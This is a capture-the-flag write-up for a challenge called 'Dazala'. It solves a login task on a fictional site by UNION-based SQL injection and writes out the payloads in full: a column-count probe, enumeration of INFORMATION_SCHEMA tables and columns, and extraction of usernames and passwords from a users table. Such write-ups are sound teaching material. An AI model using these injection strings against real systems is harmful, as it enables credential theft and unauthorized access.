# Dazala

## Description
SQL Injection is a very common technique used by attackers to bypass web security. There are a multitude of possible SQL injections.
Dazala, an online product management site, did not secure their code that was written in the 1990s. Can we raise this to their management? If we manage to enter the root account, we might cause a panic.

Log in as the root user!

## Solution

1. I started by finding the number of columns that are being shown. When I used `' order by 4-- -`, there was an error. Thus, we can conlude there are only 3 columns being displayed.
   
2. Now, let's see the different tables and their schemas from which we can find the root user with `cn' UNION select TABLE_NAME,TABLE_SCHEMA,3 from INFORMATION_SCHEMA.TABLES-- -`
   
   <img width="333" alt="image" src="https://github.com/swaathiLaks/Mimosa-Solutions/assets/113973466/f9b27714-2f03-4663-b09c-5c0d541f6ad5">

    There only appears to be 2 columns that may be useful to us.

3. Now let's view the columns in these tables. Use the following injection: `cn' UNION select COLUMN_NAME,TABLE_SCHEMA,3 from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -`

    <img width="328" alt="image" src="https://github.com/swaathiLaks/Mimosa-Solutions/assets/113973466/7f1b5740-95d4-4974-945d-f30f7fe65e30">
  
    It appears the information we need is in the user table in the public schema.

4. Let's find the password for the root user! By using `cn' UNION select username, password, 4 from public.users-- -` you can find the password.
   
     <img width="330" alt="image" src="https://github.com/swaathiLaks/Mimosa-Solutions/assets/113973466/e2cec36a-aad1-4205-9584-e2ed5010f64c">
